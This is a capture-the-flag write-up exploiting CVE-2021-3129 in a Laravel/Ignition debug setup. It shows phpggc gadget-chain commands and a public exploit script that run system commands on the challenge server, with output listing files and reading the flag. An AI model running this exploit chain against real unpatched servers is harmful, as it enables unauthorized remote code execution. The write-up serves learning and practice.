# DaaS
This challenge takes is a default setup of a Laravel page.
In the bottom left we can see its `Laravel v8.35.1 (PHP v7.4.16)`

![](https://i.imgur.com/ng0QWzk.png)

After doing some research, there is **CVE-2021-3129** which there is tool to exploit: https://github.com/ambionics/laravel-exploits

Exploit:
```bash=
$ php -d'phar.readonly=0' ../phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system ls

$ ./laravel-ignition-rce.py http://139.59.168.47:31326/ /tmp/exploit.phar   
+ Log file: /www/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
favicon.ico
index.php
robots.txt
storage
web.config
--------------------------
+ Logs cleared


$ php -d'phar.readonly=0' ../phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "ls ../.." 

$ ./laravel-ignition-rce.py http://139.59.168.47:31326/ /tmp/exploit.phar                                                                                                                                                         
+ Log file: /www/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
bin
boot
dev
entrypoint.sh
etc
flagInA6d
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
--------------------------
+ Logs cleared
       
       
$ php -d'phar.readonly=0' ../phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "cat ../../flagInA6d"                                                                                                
$ ./laravel-ignition-rce.py http://139.59.168.47:31326/ /tmp/exploit.phar

+ Log file: /www/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
--------------------------
+ Logs cleared
```

And there's the the flag `CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}`